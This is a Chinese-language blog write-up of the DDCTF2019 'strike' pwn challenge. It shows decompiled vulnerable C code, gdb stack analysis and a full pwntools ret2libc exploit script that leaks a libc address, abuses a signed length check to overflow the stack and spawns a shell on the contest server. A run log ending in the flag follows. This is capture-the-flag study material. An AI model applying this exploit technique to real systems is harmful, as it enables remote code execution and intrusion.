@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>DDCTF2019 [Pwn]strike | Twings</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言Pwn菜鸡比赛的时候不会做，时间都花在Web题上面了，只能比赛后来复现了。">
+<meta name="keywords" content="CTF,Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF2019 [Pwn]strike">
+<meta property="og:url" content="http://yoursite.com/2019/04/23/DDCTF2019-Pwn-strike/index.html">
+<meta property="og:site_name" content="Twings">
+<meta property="og:description" content="前言Pwn菜鸡比赛的时候不会做，时间都花在Web题上面了，只能比赛后来复现了。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-04-23T07:49:08.043Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF2019 [Pwn]strike">
+<meta name="twitter:description" content="前言Pwn菜鸡比赛的时候不会做，时间都花在Web题上面了，只能比赛后来复现了。">
+  
+    <link rel="alternate" href="/atom.xml" title="Twings" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/31733328.jfif?raw=true">
+    <h2 class="author">Aluvion</h2>
+    <h3 class="description">摸鱼</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>26</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>6</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-DDCTF2019-Pwn-strike" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/23/DDCTF2019-Pwn-strike/" class="article-date">
+  <time class="post-time" datetime="2019-04-23T06:38:02.000Z" itemprop="datePublished">
+    <span class="post-month">4月</span><br>
+    <span class="post-day">23</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DDCTF2019 [Pwn]strike
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- <div id="toc" class="toc-article">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li></ol>
+</div> -->
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Pwn菜鸡比赛的时候不会做，时间都花在Web题上面了，只能比赛后来复现了。</p>
+<a id="more"></a>
+<hr>
+<p>查看保护，基本没有什么保护：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/aluvion/Desktop/xpwn'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>IDA反编译，主要漏洞代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-48h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-4Ch]@4</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+40h] [bp-Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [sp+48h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>漏洞点有三个：</p>
+<ul>
+<li>fprintf(a2, “Hello %s”, &amp;buf) 字符串没有\x00结尾，可以用栈溢出来泄露地址</li>
+<li>限制输入长度的时候，使用的是有符号数，输入的时候使用的是无符号数，没有进行负数检查，我们输入负数即可获得一个相当长的输入长度上限</li>
+<li>read(v1, &amp;buf, nbytes) 栈溢出漏洞</li>
+</ul>
+<p>首先我们用gdb调试，看看栈里面有什么值得泄露的数据：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x08048610 in ?? ()</span><br><span class="line"><span class="meta">gdb-peda$</span> stack 25</span><br><span class="line">0000| 0xffffd4a0 --&gt; 0x0 </span><br><span class="line">0004| 0xffffd4a4 --&gt; 0xffffd4b0 ("Twings\n\bX\202\004\b")</span><br><span class="line">0008| 0xffffd4a8 --&gt; 0x40 ('@')</span><br><span class="line">0012| 0xffffd4ac --&gt; 0xffffd528 --&gt; 0xf7e0cdc8 --&gt; 0x2b76 ('v+')</span><br><span class="line">0016| 0xffffd4b0 ("Twings\n\bX\202\004\b")</span><br><span class="line">0020| 0xffffd4b4 --&gt; 0x80a7367 </span><br><span class="line">0024| 0xffffd4b8 --&gt; 0x8048258 --&gt; 0x57 ('W')</span><br><span class="line">0028| 0xffffd4bc --&gt; 0x0 </span><br><span class="line">0032| 0xffffd4c0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x0 </span><br><span class="line">0036| 0xffffd4c4 --&gt; 0xf7e0ccc8 --&gt; 0x29d0 </span><br><span class="line">0040| 0xffffd4c8 --&gt; 0xf7e6021b (&lt;__GI__IO_setbuffer+11&gt;:	add    ebx,0x151de5)</span><br><span class="line">0044| 0xffffd4cc --&gt; 0x0 </span><br><span class="line">0048| 0xffffd4d0 --&gt; 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">0052| 0xffffd4d4 --&gt; 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">0056| 0xffffd4d8 --&gt; 0xffffd568 --&gt; 0x0 </span><br><span class="line">0060| 0xffffd4dc --&gt; 0xf7e66005 (&lt;setbuf+21&gt;:	add    esp,0x1c)</span><br><span class="line">0064| 0xffffd4e0 --&gt; 0xf7fb2d60 --&gt; 0xfbad2887 </span><br><span class="line">0068| 0xffffd4e4 --&gt; 0x0 </span><br><span class="line">0072| 0xffffd4e8 --&gt; 0x2000 ('')</span><br><span class="line">0076| 0xffffd4ec --&gt; 0xf7e65ff0 (&lt;setbuf&gt;:	sub    esp,0x10)</span><br><span class="line">0080| 0xffffd4f0 --&gt; 0xf7fb2d60 --&gt; 0xfbad2887 </span><br><span class="line">0084| 0xffffd4f4 --&gt; 0xf7ffd918 --&gt; 0x0 </span><br><span class="line">0088| 0xffffd4f8 --&gt; 0xffffd568 --&gt; 0x0 </span><br><span class="line">0092| 0xffffd4fc --&gt; 0x80486a3 (add    esp,0x10)</span><br><span class="line">0096| 0xffffd500 --&gt; 0xf7fb25a0 --&gt; 0xfbad2088 </span><br><span class="line"><span class="meta">gdb-peda$</span> p $ebp</span><br><span class="line"><span class="meta">$</span>25 = (void *) 0xffffd4f8</span><br></pre></td></tr></table></figure>
+<p>可以看到这么一行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0060| 0xffffd4dc --&gt; 0xf7e66005 (&lt;setbuf+21&gt;:	add    esp,0x1c)</span><br></pre></td></tr></table></figure>
+<p>所以我们只要用数据一直覆盖掉 0xffffd4d4 地址处的 \x00 ，我们就可以将 setbuf 函数地址 +21 后的地址泄露出来，然后计算 libc 的偏移。</p>
+<p>同时我们还可以关注到一点：0xffffd4d8 地址处的数据和 ebp 寄存器中的数据是一样的，所以我们还同时可以得到 mian 函数的基地址。</p>
+<p>但是题目没有简单到，计算出偏移之后就可以直接利用第二个栈溢出 getshell 的地步：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x804872d:	call   0x8048470 &lt;puts@plt&gt;</span><br><span class="line">0x8048732:	add    esp,0x10</span><br><span class="line">0x8048735:	mov    eax,0x0</span><br><span class="line">0x804873a:	lea    esp,[ebp-0x8]</span><br><span class="line">0x804873d:	pop    ecx</span><br><span class="line">0x804873e:	pop    ebx</span><br><span class="line">0x804873f:	pop    ebp</span><br><span class="line">0x8048740:	lea    esp,[ecx-0x4]</span><br></pre></td></tr></table></figure>
+<p>可以看到，main 函数最后用 lea 指令做了一下简单的栈溢出防护，如果我们在溢出的过程中破坏了 ebp - 0x8 地址处的数据，就会导致 esp 寄存器错误，最后程序报错退出。所以我们需要在栈溢出的时候，修复这个地方的数据。</p>
+<p>同样是 gdb 调试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0xffffffff </span><br><span class="line">ECX: 0xffffffff </span><br><span class="line">EDX: 0xf7fb3870 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0xffffd568 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd510 --&gt; 0x0 </span><br><span class="line">EIP: 0x804873a (lea    esp,[ebp-0x8])</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804872d:	call   0x8048470 &lt;puts@plt&gt;</span><br><span class="line">   0x8048732:	add    esp,0x10</span><br><span class="line">   0x8048735:	mov    eax,0x0</span><br><span class="line">=&gt; 0x804873a:	lea    esp,[ebp-0x8]</span><br><span class="line">   0x804873d:	pop    ecx</span><br><span class="line">   0x804873e:	pop    ebx</span><br><span class="line">   0x804873f:	pop    ebp</span><br><span class="line">   0x8048740:	lea    esp,[ecx-0x4]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd510 --&gt; 0x0 </span><br><span class="line">0004| 0xffffd514 --&gt; 0xffffd5b4 --&gt; 0x5f0267f1 </span><br><span class="line">0008| 0xffffd518 --&gt; 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">0012| 0xffffd51c ("Twings\n\377/")</span><br><span class="line">0016| 0xffffd520 --&gt; 0xff0a7367 </span><br><span class="line">0020| 0xffffd524 --&gt; 0x2f ('/')</span><br><span class="line">0024| 0xffffd528 --&gt; 0xf7e0cdc8 --&gt; 0x2b76 ('v+')</span><br><span class="line">0028| 0xffffd52c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0804873a in ?? ()</span><br><span class="line"><span class="meta">gdb-peda$</span> p $ebp</span><br><span class="line"><span class="meta">$</span>26 = (void *) 0xffffd568</span><br><span class="line"><span class="meta">gdb-peda$</span> p $ebp - 8</span><br><span class="line"><span class="meta">$</span>27 = (void *) 0xffffd560</span><br><span class="line"><span class="meta">gdb-peda$</span> p *0xffffd560</span><br><span class="line"><span class="meta">$</span>28 = 0xffffd580</span><br><span class="line"><span class="meta">gdb-peda$</span> p 0xffffd560 - 0xffffd51c</span><br><span class="line"><span class="meta">$</span>29 = 0x44</span><br><span class="line"><span class="meta">gdb-peda$</span> p 0xffffd580 - 0xffffd568</span><br><span class="line"><span class="meta">$</span>30 = 0x18</span><br></pre></td></tr></table></figure>
+<p>我们的输入的地址为 0xffffd51c ，要修改的地址为 0xffffd560 ，偏移为 0x44；数据为 0xffffd580 ，跟 ebp 寄存器中地址（main 函数的基地址）的偏移为 0x18。</p>
+<p>我们继续调试得到 main 函数的返回地址来覆盖：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xffffd580 --&gt; 0x1 </span><br><span class="line">EDX: 0xf7fb3870 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0x0 </span><br><span class="line">ESP: 0xffffd57c --&gt; 0xf7e18637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</span><br><span class="line">EIP: 0x8048743 (ret)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804873e:	pop    ebx</span><br><span class="line">   0x804873f:	pop    ebp</span><br><span class="line">   0x8048740:	lea    esp,[ecx-0x4]</span><br><span class="line">=&gt; 0x8048743:	ret    </span><br><span class="line">   0x8048744:	xchg   ax,ax</span><br><span class="line">   0x8048746:	xchg   ax,ax</span><br><span class="line">   0x8048748:	xchg   ax,ax</span><br><span class="line">   0x804874a:	xchg   ax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd57c --&gt; 0xf7e18637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</span><br><span class="line">0004| 0xffffd580 --&gt; 0x1 </span><br><span class="line">0008| 0xffffd584 --&gt; 0xffffd614 --&gt; 0xffffd77b ("/home/aluvion/Desktop/xpwn")</span><br><span class="line">0012| 0xffffd588 --&gt; 0xffffd61c --&gt; 0xffffd796 ("LC_PAPER=zh_CN.UTF-8")</span><br><span class="line">0016| 0xffffd58c --&gt; 0x0 </span><br><span class="line">0020| 0xffffd590 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd594 --&gt; 0x0 </span><br><span class="line">0028| 0xffffd598 --&gt; 0xf7fb2000 --&gt; 0x1b1db0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048743 in ?? ()</span><br><span class="line"><span class="meta">gdb-peda$</span> p 0xffffd57c - 0xffffd51c</span><br><span class="line"><span class="meta">$</span>31 = 0x60</span><br></pre></td></tr></table></figure>
+<p> 可以看到返回地址为 0xffffd57c ，跟我们的输入的偏移为 0x60 ，我们可以写出脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"../xpwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"../libc.so.6"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">system_libc = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">setbuf_libc = libc.symbols[<span class="string">"setbuf"</span>]</span><br><span class="line">bin_sh_libc = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># target = process("../xpwn")</span></span><br><span class="line">target = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">"Enter username: "</span>)</span><br><span class="line">target.sendline(<span class="string">"p"</span> * <span class="number">36</span>)</span><br><span class="line">target.recvuntil(<span class="string">"p"</span> * <span class="number">36</span>)</span><br><span class="line">target.recv(<span class="number">4</span>)</span><br><span class="line">main_ebp = u32(target.recv(<span class="number">4</span>))</span><br><span class="line">setbuf_addr = u32(target.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"main ebp: "</span> + hex(main_ebp)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"setbuf addr: "</span> + hex(setbuf_addr)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">"password: "</span>)</span><br><span class="line">target.sendline(<span class="string">'-1'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = setbuf_addr - setbuf_libc + system_libc</span><br><span class="line">bin_sh_addr = setbuf_addr - setbuf_libc + bin_sh_libc</span><br><span class="line">payload = <span class="string">"p"</span> * <span class="number">0x44</span> + p32(main_ebp + <span class="number">0x18</span>)</span><br><span class="line">payload += <span class="string">"p"</span> * (<span class="number">0x60</span> - <span class="number">0x44</span> - <span class="number">0x04</span>) + p32(system_addr)</span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">0x04</span> + p32(bin_sh_addr)</span><br><span class="line">target.recvuntil(<span class="string">"): "</span>)</span><br><span class="line">target.send(payload)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">root@Aluvion:/home/aluvion/Desktop/二进制# python dd2019.py </span><br><span class="line">[*] '/home/aluvion/Desktop/xpwn'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] '/home/aluvion/Desktop/libc.so.6'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 116.85.48.105 on port 5005: Done</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    'Enter username: '</span><br><span class="line">[DEBUG] Sent 0x25 bytes:</span><br><span class="line">    'pppppppppppppppppppppppppppppppppppp\n'</span><br><span class="line">[DEBUG] Received 0x3a bytes:</span><br><span class="line">    00000000  48 65 6c 6c  6f 20 70 70  70 70 70 70  70 70 70 70  │Hell│o pp│pppp│pppp│</span><br><span class="line">    00000010  70 70 70 70  70 70 70 70  70 70 70 70  70 70 70 70  │pppp│pppp│pppp│pppp│</span><br><span class="line">    00000020  70 70 70 70  70 70 70 70  70 70 0a f0  6e f7 f8 1b  │pppp│pppp│pp··│n···│</span><br><span class="line">    00000030  92 ff 65 44  5a f7 60 fd  6e f7                     │··eD│Z·`·│n·│</span><br><span class="line">    0000003a</span><br><span class="line">main ebp: 0xff921bf8</span><br><span class="line">setbuf addr: 0xf75a4450</span><br><span class="line">[*] Paused (press any to continue)</span><br><span class="line">[DEBUG] Received 0x23 bytes:</span><br><span class="line">    'Please set the length of password: '</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    '-1\n'</span><br><span class="line">[DEBUG] Received 0x22 bytes:</span><br><span class="line">    'Enter password(lenth 4294967295): '</span><br><span class="line">[DEBUG] Sent 0x6c bytes:</span><br><span class="line">    00000000  70 70 70 70  70 70 70 70  70 70 70 70  70 70 70 70  │pppp│pppp│pppp│pppp│</span><br><span class="line">    *</span><br><span class="line">    00000040  70 70 70 70  10 1c 92 ff  70 70 70 70  70 70 70 70  │pppp│····│pppp│pppp│</span><br><span class="line">    00000050  70 70 70 70  70 70 70 70  70 70 70 70  70 70 70 70  │pppp│pppp│pppp│pppp│</span><br><span class="line">    00000060  40 99 57 f7  61 61 61 61  2b 80 69 f7               │@·W·│aaaa│+·i·││</span><br><span class="line">    0000006c</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0xe bytes:</span><br><span class="line">    'All done, bye!'</span><br><span class="line">All done, bye![DEBUG] Received 0x1 bytes:</span><br><span class="line">    '\n'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    'cat flag\n'</span><br><span class="line">[DEBUG] Received 0x23 bytes:</span><br><span class="line">    'DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;'</span><br><span class="line">DDCTF&#123;s0_3asy_St4ck0verfl0w_r1ght?&#125;$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to 116.85.48.105 port 5005</span><br></pre></td></tr></table></figure>
+<hr>
+<p>Orz</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/23/DDCTF2019-Pwn-strike/" data-id="cjuthnz770004u0v6kc8lqgzw" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/04/19/DDCTF2019-Web题解/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">DDCTF2019-Web题解</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Twings</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
